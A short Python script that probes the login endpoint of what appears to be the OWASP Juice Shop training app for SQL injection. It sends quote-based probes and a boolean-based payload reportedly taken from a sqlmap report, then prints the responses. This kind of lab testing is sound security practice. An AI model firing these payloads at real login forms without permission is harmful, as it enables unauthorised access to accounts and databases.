import requests

# Target URL
url = "http://juice-shop:3000/rest/user/login"

# Test payloads to verify SQL injection
payloads = [
    {"email": "test@example.com", "password": "Test1234!"},  # Normal
    {"email": "test@example.com'", "password": "Test1234!"},  # Simple quote injection
    {"email": "test@example.com''", "password": "Test1234!"},  # Double quote (might normalize)
]

print("Testing SQL injection in email parameter:")
for i, payload in enumerate(payloads):
    try:
        response = requests.post(url, json=payload)
        print(f"Payload {i+1}: Status {response.status_code}, Length {len(response.text)}")
        if i > 0 and response.status_code != 401:
            print(f"  ^ Different response for injection payload!")
    except Exception as e:
        print(f"Payload {i+1}: Error - {e}")

# Try the exact payload from sqlmap report
sqlmap_payload = {
    "email": "test@example.com' AND CASE WHEN 9716=9716 THEN 9716 ELSE JSON(CHAR(78,113,120,75)) END-- VCML",
    "password": "Test1234!"
}

print("\nTesting exact sqlmap payload:")
try:
    response = requests.post(url, json=sqlmap_payload)
    print(f"Sqlmap payload: Status {response.status_code}, Length {len(response.text)}")
    print(f"Response: {response.text}")
except Exception as e:
    print(f"Sqlmap payload: Error - {e}")
